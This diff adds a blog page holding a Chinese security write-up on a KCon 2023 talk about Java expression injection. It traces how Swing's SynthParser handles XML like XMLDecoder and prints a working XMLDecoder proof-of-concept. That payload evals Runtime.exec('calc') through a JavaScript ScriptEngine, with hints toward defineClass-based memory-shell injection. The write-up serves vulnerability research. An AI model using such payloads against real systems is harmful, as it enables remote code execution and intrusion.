@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="背景翻阅 kcon2023 的议题，其中 web 相关的一个议题《Java表达式攻防下的黑魔法》吸引了我的注意，正好前不久碰到了一个表达式注入的漏洞，但是当时只是用了执行简单命令的 poc，没有做更多的动作就提交了。这篇议题主要介绍了表达式注入到武器化的利用，还是相当精彩的。 作者在最后一页放出了一个新的表达式的利用，并且提出了一个问题：  其实核心就是命令执行到代码执行。 仔细想想，挖掘漏洞只是">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从 xml 到内存马 -- kcon 议题解析">
+<meta property="og:url" content="http://example.com/2024/07/07/%E4%BB%8E-xml-%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC-kcon-%E8%AE%AE%E9%A2%98%E8%A7%A3%E6%9E%90/">
+<meta property="og:site_name" content="wude">
+<meta property="og:description" content="背景翻阅 kcon2023 的议题，其中 web 相关的一个议题《Java表达式攻防下的黑魔法》吸引了我的注意，正好前不久碰到了一个表达式注入的漏洞，但是当时只是用了执行简单命令的 poc，没有做更多的动作就提交了。这篇议题主要介绍了表达式注入到武器化的利用，还是相当精彩的。 作者在最后一页放出了一个新的表达式的利用，并且提出了一个问题：  其实核心就是命令执行到代码执行。 仔细想想，挖掘漏洞只是">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2024/07/07/%E4%BB%8E-xml-%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC-kcon-%E8%AE%AE%E9%A2%98%E8%A7%A3%E6%9E%90/image-20240707185607689.png">
+<meta property="og:image" content="http://example.com/2024/07/07/%E4%BB%8E-xml-%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC-kcon-%E8%AE%AE%E9%A2%98%E8%A7%A3%E6%9E%90/image-20240707185624287.png">
+<meta property="og:image" content="http://example.com/2024/07/07/%E4%BB%8E-xml-%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC-kcon-%E8%AE%AE%E9%A2%98%E8%A7%A3%E6%9E%90/image-20240707185642925.png">
+<meta property="og:image" content="http://example.com/2024/07/07/%E4%BB%8E-xml-%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC-kcon-%E8%AE%AE%E9%A2%98%E8%A7%A3%E6%9E%90/image-20240707185704245.png">
+<meta property="og:image" content="http://example.com/2024/07/07/%E4%BB%8E-xml-%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC-kcon-%E8%AE%AE%E9%A2%98%E8%A7%A3%E6%9E%90/image-20240707185720643.png">
+<meta property="og:image" content="http://example.com/2024/07/07/%E4%BB%8E-xml-%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC-kcon-%E8%AE%AE%E9%A2%98%E8%A7%A3%E6%9E%90/image-20240707185739988.png">
+<meta property="og:image" content="http://example.com/2024/07/07/%E4%BB%8E-xml-%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC-kcon-%E8%AE%AE%E9%A2%98%E8%A7%A3%E6%9E%90/image-20240707185756646.png">
+<meta property="article:published_time" content="2024-07-07T10:54:44.000Z">
+<meta property="article:modified_time" content="2024-07-07T11:00:45.523Z">
+<meta property="article:author" content="wude">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2024/07/07/%E4%BB%8E-xml-%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC-kcon-%E8%AE%AE%E9%A2%98%E8%A7%A3%E6%9E%90/image-20240707185607689.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>从 xml 到内存马 -- kcon 议题解析</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/07/07/apache-soap-rce-cve-2022-45378/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/07/07/%E4%BB%8E-xml-%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC-kcon-%E8%AE%AE%E9%A2%98%E8%A7%A3%E6%9E%90/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/07/07/%E4%BB%8E-xml-%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC-kcon-%E8%AE%AE%E9%A2%98%E8%A7%A3%E6%9E%90/&text=从 xml 到内存马 -- kcon 议题解析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/07/07/%E4%BB%8E-xml-%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC-kcon-%E8%AE%AE%E9%A2%98%E8%A7%A3%E6%9E%90/&title=从 xml 到内存马 -- kcon 议题解析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/07/07/%E4%BB%8E-xml-%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC-kcon-%E8%AE%AE%E9%A2%98%E8%A7%A3%E6%9E%90/&is_video=false&description=从 xml 到内存马 -- kcon 议题解析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=从 xml 到内存马 -- kcon 议题解析&body=Check out this article: http://example.com/2024/07/07/%E4%BB%8E-xml-%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC-kcon-%E8%AE%AE%E9%A2%98%E8%A7%A3%E6%9E%90/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/07/07/%E4%BB%8E-xml-%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC-kcon-%E8%AE%AE%E9%A2%98%E8%A7%A3%E6%9E%90/&title=从 xml 到内存马 -- kcon 议题解析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/07/07/%E4%BB%8E-xml-%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC-kcon-%E8%AE%AE%E9%A2%98%E8%A7%A3%E6%9E%90/&title=从 xml 到内存马 -- kcon 议题解析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/07/07/%E4%BB%8E-xml-%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC-kcon-%E8%AE%AE%E9%A2%98%E8%A7%A3%E6%9E%90/&title=从 xml 到内存马 -- kcon 议题解析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/07/07/%E4%BB%8E-xml-%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC-kcon-%E8%AE%AE%E9%A2%98%E8%A7%A3%E6%9E%90/&title=从 xml 到内存马 -- kcon 议题解析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/07/07/%E4%BB%8E-xml-%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC-kcon-%E8%AE%AE%E9%A2%98%E8%A7%A3%E6%9E%90/&name=从 xml 到内存马 -- kcon 议题解析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/07/07/%E4%BB%8E-xml-%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC-kcon-%E8%AE%AE%E9%A2%98%E8%A7%A3%E6%9E%90/&t=从 xml 到内存马 -- kcon 议题解析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%83%8C%E6%99%AF"><span class="toc-number">1.</span> <span class="toc-text">背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">2.</span> <span class="toc-text">任意代码执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#btw"><span class="toc-number">3.</span> <span class="toc-text">btw</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        从 xml 到内存马 -- kcon 议题解析
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">wude</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-07-07T10:54:44.000Z" class="dt-published" itemprop="datePublished">2024-07-07</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>翻阅 kcon2023 的议题，其中 web 相关的一个议题《Java表达式攻防下的黑魔法》吸引了我的注意，正好前不久碰到了一个表达式注入的漏洞，但是当时只是用了执行简单命令的 poc，没有做更多的动作就提交了。这篇议题主要介绍了表达式注入到武器化的利用，还是相当精彩的。</p>
+<p>作者在最后一页放出了一个新的表达式的利用，并且提出了一个问题：</p>
+<p><img src="/2024/07/07/%E4%BB%8E-xml-%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC-kcon-%E8%AE%AE%E9%A2%98%E8%A7%A3%E6%9E%90/image-20240707185607689.png" alt="image-20240707185607689"></p>
+<p>其实核心就是命令执行到代码执行。</p>
+<p>仔细想想，挖掘漏洞只是第一步，如何利用漏洞，把漏洞价值最大化也是一个需要研究的地方。在实际中，命令执行，特别是弹计算器，只需要简单一行，而代码执行有时候会碰到各种问题，比如没有相关依赖，限制输入长度，还有不同语法等。</p>
+<p>在 web 相关的 rce 洞中，打入内存马算是一个比较好的利用方式，写入内存马本质上也是代码执行。</p>
+<p>回到问题，作者在前面已经介绍了从 js 引擎到任意代码执行的方式，其实是通过调用 Java 的 defineClass 能力，实例化我们的类，然后执行代码。所以这里要做的就是执行 js 代码，比如 <code>scirptEngine.eval()</code> ，能做到这点就几乎解答了问题。</p>
+<h2 id="任意代码执行"><a href="#任意代码执行" class="headerlink" title="任意代码执行"></a>任意代码执行</h2><p>先来理解一下这个利用链，根据给出的 poc，查看 load 方法：</p>
+<p><img src="/2024/07/07/%E4%BB%8E-xml-%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC-kcon-%E8%AE%AE%E9%A2%98%E8%A7%A3%E6%9E%90/image-20240707185624287.png" alt="image-20240707185624287"></p>
+<p>调用 SynthParser 去 parse 传入的 xml 内容，该类继承了 DefaultHandler ：</p>
+<p><img src="/2024/07/07/%E4%BB%8E-xml-%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC-kcon-%E8%AE%AE%E9%A2%98%E8%A7%A3%E6%9E%90/image-20240707185642925.png" alt="image-20240707185642925"></p>
+<p>关于这个 DefaultHandler 是用来处理传入的 xml 的内容的，我们也可以自定义一个类继承它实现一些想要的功能，参考：<a target="_blank" rel="noopener" href="https://y4er.com/posts/java-xmldecoder/">https://y4er.com/posts/java-xmldecoder/</a></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xml.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.xml.sax.Attributes;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.SAXException;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.helpers.DefaultHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.SAXParser;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.SAXParserFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoHandler</span> <span class="keyword">extends</span> <span class="title class_">DefaultHandler</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">SAXParserFactory</span> <span class="variable">saxParserFactory</span> <span class="operator">=</span> SAXParserFactory.newInstance();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">SAXParser</span> <span class="variable">parser</span> <span class="operator">=</span> saxParserFactory.newSAXParser();</span><br><span class="line">            <span class="type">DemoHandler</span> <span class="variable">dh</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DemoHandler</span>();</span><br><span class="line">            <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;src/main/resources/calc.xml&quot;</span>;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(path);</span><br><span class="line">            parser.parse(file, dh);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">characters</span><span class="params">(<span class="type">char</span>[] ch, <span class="type">int</span> start, <span class="type">int</span> length)</span> <span class="keyword">throws</span> SAXException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;characters()&quot;</span>);</span><br><span class="line">        <span class="built_in">super</span>.characters(ch, start, length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">startDocument</span><span class="params">()</span> <span class="keyword">throws</span> SAXException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;startDocument()&quot;</span>);</span><br><span class="line">        <span class="built_in">super</span>.startDocument();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">endDocument</span><span class="params">()</span> <span class="keyword">throws</span> SAXException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;endDocument()&quot;</span>);</span><br><span class="line">        <span class="built_in">super</span>.endDocument();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;startElement()&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; attributes.getLength(); i++) &#123;</span><br><span class="line">            <span class="comment">// getQName()是获取属性名称，</span></span><br><span class="line">            System.out.print(attributes.getQName(i) + <span class="string">&quot;=\&quot;&quot;</span> + attributes.getValue(i) + <span class="string">&quot;\&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">super</span>.startElement(uri, localName, qName, attributes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">endElement</span><span class="params">(String uri, String localName, String qName)</span> <span class="keyword">throws</span> SAXException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;endElement()&quot;</span>);</span><br><span class="line">        System.out.println(uri + localName + qName);</span><br><span class="line">        <span class="built_in">super</span>.endElement(uri, localName, qName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">startDocument()</span><br><span class="line">startElement()</span><br><span class="line">characters()</span><br><span class="line">startElement()</span><br><span class="line">class=&quot;java.lang.ProcessBuilder&quot;</span><br><span class="line">characters()</span><br><span class="line">startElement()</span><br><span class="line">class=&quot;java.lang.String&quot;</span><br><span class="line">length=&quot;1&quot;</span><br><span class="line">characters()</span><br><span class="line">startElement()</span><br><span class="line">index=&quot;0&quot;</span><br><span class="line">characters()</span><br><span class="line">startElement()</span><br><span class="line">characters()</span><br><span class="line">endElement()</span><br><span class="line">string</span><br><span class="line">characters()</span><br><span class="line">endElement()</span><br><span class="line">void</span><br><span class="line">characters()</span><br><span class="line">endElement()</span><br><span class="line">array</span><br><span class="line">characters()</span><br><span class="line">startElement()</span><br><span class="line">method=&quot;start&quot;</span><br><span class="line">endElement()</span><br><span class="line">void</span><br><span class="line">characters()</span><br><span class="line">endElement()</span><br><span class="line">object</span><br><span class="line">characters()</span><br><span class="line">endElement()</span><br><span class="line">java</span><br><span class="line">endDocument()</span><br></pre></td></tr></table></figure>
+
+<p>这里是把文章的内容复制的，主要是理解一下 handler 的作用。</p>
+<p>看一下这个类重载的方法：</p>
+<p><img src="/2024/07/07/%E4%BB%8E-xml-%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC-kcon-%E8%AE%AE%E9%A2%98%E8%A7%A3%E6%9E%90/image-20240707185704245.png" alt="image-20240707185704245"></p>
+<p>getHandler 方法：</p>
+<p><img src="/2024/07/07/%E4%BB%8E-xml-%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC-kcon-%E8%AE%AE%E9%A2%98%E8%A7%A3%E6%9E%90/image-20240707185720643.png" alt="image-20240707185720643"></p>
+<p>可以看到是使用 DocumentHandler 来处理，关于 DocumentHandler ，熟悉 XMLDecoder 的反序列化的就知道，XMLDecoder 也是用它来进行反序列化的处理。所以构造的 payload 和 XMLDecoder 的 payload 是一样的。</p>
+<p>关于 DocumentHandler 可以参考：<a target="_blank" rel="noopener" href="https://y4er.com/posts/java-xmldecoder%EF%BC%8Chttps://blog.viettelcybersecurity.com/saml-show-stopper/">https://y4er.com/posts/java-xmldecoder，https://blog.viettelcybersecurity.com/saml-show-stopper/</a></p>
+<p>所以现在问题变成了 XMLDecoder 反序列化实现任意代码执行。</p>
+<p>其实本质就是构造一个让 DocumentHandler 处理的 xml，看一下该类支持的标签：</p>
+<p><img src="/2024/07/07/%E4%BB%8E-xml-%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC-kcon-%E8%AE%AE%E9%A2%98%E8%A7%A3%E6%9E%90/image-20240707185739988.png" alt="image-20240707185739988"></p>
+<p>具体的构造方法还是参考上面 y4er 师傅的文章，下面直接给出 poc：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.8&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;javax.script.ScriptEngineManager&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">void</span> <span class="attr">id</span>=<span class="string">&quot;se&quot;</span> <span class="attr">method</span>=<span class="string">&quot;getEngineByName&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">string</span>&gt;</span>js<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">object</span> <span class="attr">idref</span>=<span class="string">&quot;se&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;eval&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">string</span>&gt;</span>&lt;![CDATA[java.lang.Runtime.getRuntime().exec(&#x27;calc&#x27;)]]&gt;<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>主要是利用 idref 属性引用得到的 ScriptEngine 的实例从而运行 eval 方法。</p>
+<p>实际构造方法多样，只要按照 DocumentHandler 的语法构造都能正常运行。</p>
+<p>实使用的时候只需要替换 eval 的内容，参考议题讲的如何用 js eval 方法调用 java 的 defineClass 。</p>
+<h2 id="btw"><a href="#btw" class="headerlink" title="btw"></a>btw</h2><p>从这里可以看出，并不局限于 xml 后缀名，只要文件内容是合法的 xml 就可以。</p>
+<p><img src="/2024/07/07/%E4%BB%8E-xml-%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC-kcon-%E8%AE%AE%E9%A2%98%E8%A7%A3%E6%9E%90/image-20240707185756646.png" alt="image-20240707185756646"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%83%8C%E6%99%AF"><span class="toc-number">1.</span> <span class="toc-text">背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">2.</span> <span class="toc-text">任意代码执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#btw"><span class="toc-number">3.</span> <span class="toc-text">btw</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/07/07/%E4%BB%8E-xml-%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC-kcon-%E8%AE%AE%E9%A2%98%E8%A7%A3%E6%9E%90/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/07/07/%E4%BB%8E-xml-%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC-kcon-%E8%AE%AE%E9%A2%98%E8%A7%A3%E6%9E%90/&text=从 xml 到内存马 -- kcon 议题解析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/07/07/%E4%BB%8E-xml-%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC-kcon-%E8%AE%AE%E9%A2%98%E8%A7%A3%E6%9E%90/&title=从 xml 到内存马 -- kcon 议题解析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/07/07/%E4%BB%8E-xml-%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC-kcon-%E8%AE%AE%E9%A2%98%E8%A7%A3%E6%9E%90/&is_video=false&description=从 xml 到内存马 -- kcon 议题解析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=从 xml 到内存马 -- kcon 议题解析&body=Check out this article: http://example.com/2024/07/07/%E4%BB%8E-xml-%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC-kcon-%E8%AE%AE%E9%A2%98%E8%A7%A3%E6%9E%90/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
